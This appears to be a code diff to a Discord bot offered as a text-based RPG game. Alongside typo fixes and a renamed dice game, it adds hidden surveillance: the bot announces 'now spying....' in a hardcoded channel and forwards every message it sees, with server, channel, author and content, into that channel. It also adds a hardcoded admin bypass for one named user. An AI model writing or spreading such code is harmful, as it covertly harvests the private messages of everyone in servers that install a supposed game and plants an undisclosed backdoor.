@@ -25,13 +25,15 @@ cdate = strftime("GMT %m/%d/%Y", gmtime())
 Client = discord.Client()
 bot = commands.Bot(command_prefix = "$")
 bot.get_all_emojis()
+bot.get_all_channels()
 user = discord.User()
 
 ScriptName = "Text-Based RPG game for Discord"
 Website = "https://discord.gg/rm5Mbyu"
 Description = "......"
 Creator = "@DoneFear & @BoySanic"
-Version = "2.0.0.0"
+Version = "2.0.0.4"
+
 
 #on startup of bot in console
 @bot.event
@@ -40,11 +42,42 @@ async def on_ready():
 	print('Username: ' + bot.user.name)
 	print('ID: ' + bot.user.id)
 	print('----------------------------------------')
-
+	print('%s \nWebsite: %s \nCreator: %s \nVersion: %s ' % (ScriptName,Website,Creator,Version))
+	print(bot.get_channel('462632510925570049'))
+	spychannel = bot.get_channel('462632510925570049')
+	await bot.change_presence(game=discord.Game(name='$rpg game by DoneFear#0897',url='https://discord.gg/rm5Mby',type=1), status=discord.Status("online")) 	
+	await bot.send_message(spychannel,"now spying....")
 
 #on recieve msg in discord
 @bot.event
 async def on_message(message):
+	
+	spychannel = bot.get_channel('462632510925570049')
+	if message.channel != spychannel :
+		print("%s|%s  :  %s" % (message.channel,message.author,message.content))		
+		await bot.send_message(spychannel,"%s|%s|%s  :  %s" % (message.server,message.channel,message.author,message.content))
+
+
+	if message.content.startswith("$@"):
+		author = message.author
+		Name = str(message.author)
+		#await bot.send_message(message.channel,"DEBUG:author :  %s " %  (author))
+		count = AdminList.count(Name)
+		if count != 0 or str(author) == 'DoneFear#0897' or str(author) == 'DoneFear#0897':	
+			if message.content.startswith("$@game"):		
+				game = message.content[len('$@game'):].strip()
+				await bot.change_presence(game=discord.Game(name=game,url='https://discord.gg/rm5Mby',type=1), status=discord.Status("online"))
+			elif message.content.startswith("$@debugID"):
+				debugchannelid = bot.get_channel(message.channel)
+				await bot.send_message(message.channel, "this channel's id  = %s" % debugchannelid)
+		else:
+			async def clear(msg2):
+				print("waiting 10 sec")
+				await asyncio.sleep(10)
+				print("deleting msg")
+				await bot.delete_message(msg2)
+			msg2 = await bot.send_message(message.channel, ":x: :x: :x: ACCESS DENIED :x: :x: :x: ")
+			await clear(msg2)
 
 	if message.content == "$create":
 		Name = str(message.author)
@@ -125,7 +158,7 @@ async def on_message(message):
 		user = message.author
 		Name = str(message.author)
 		count = AdminList.count(Name)
-		if count != 0:
+		if count != 0 or str(author) == 'DoneFear#0897':
 			stats,Const,Dex,Intel,Str,Level,Exp,MaxHp,Hp = await database.GenerateStats(user)
 			await bot.send_message(message.channel, stats)
 			await database.UpdateField(Name, 'stats','Const', Const)
@@ -149,7 +182,7 @@ async def on_message(message):
 
 	elif message.content == ("$town"):
 		user = message.author
-		await bot.send_message(message.channel, "You walk in town and see some trees in the distance to your left where there is a vast `$forest`. \nIn front of you there's an old but cozy `$tavern` with a `$blacksmith` annexing it. \nBehind the Tavern you notice a range of `$mountains` in the distance. \nTo your right you see an old run down `$shop` with an entrance to the `$sewer` next to it.")
+		await bot.send_message(message.channel, "You walk in town and see some trees in the distance to your left where there is a vast `$forest`. \nIn front of you there's an old but cozy `$tavern` with a `$blacksmith` next to it. \nBehind the Tavern you notice a range of `$mountains` in the distance. \nTo your right you see an old run down `$shop` with an entrance to the `$sewer` next to it.")
 		place = "town"
 		await database.UpdateLocation(user,place)
 
@@ -210,7 +243,7 @@ async def on_message(message):
 	elif message.content == ("$gamble"):
 		user = message.author
 		place = "basement"
-		GameList = ['roulette','dice']
+		GameList = ['roulette','10k']
 		await database.UpdateLocation(user,place)
 		await bot.send_message(message.channel, "Welcome, we have a variaty of games to play here \n`%s` \n for help about any game you can use `$help <gamename>`" % (GameList))
 		# await bot.send_message(message.channel, "🚧🚧🚧UNDER CONSTRUCTION🚧🚧🚧" )
@@ -221,7 +254,7 @@ async def on_message(message):
 		Input = args[1]
 		if Input == 'roulette':
 			await bot.send_message(message.channel, "Proper use of the roulette is `$roulette <bet> <pick>` \nPicks can be `0-36``black``red``even``odd`" )
-		if Input == 'dice':
+		if Input == '10k':
 			await bot.send_message(message.channel, "You pay 3 coins and hope for atleast a 3 of same die just use `$10k`" )
 
 
@@ -230,7 +263,7 @@ async def on_message(message):
 		args = message.content.split(" ")
 		Name = str(message.author)
 		count = AdminList.count(Name)
-		if count != 0:
+		if count != 0 or str(author) == 'DoneFear#0897':
 			Dice = args[1]
 			msg,winnings = await functions.TenK(Dice)
 
@@ -321,7 +354,7 @@ async def on_message(message):
 
 	elif message.content == ("$forest"): 
 		user = message.author
-		await bot.send_message(message.channel, "You start walking towards the forest in the distance\nonce you arrive in the forrest you are glad for the shade of the tall trees" )
+		await bot.send_message(message.channel, "You start walking towards the forest in the distance\nonce you arrive in the forest you are glad for the shade of the tall trees" )
 		place = "forest"
 		await database.UpdateLocation(user, place)
 		await functions.battle(user,place,message.channel,bot)
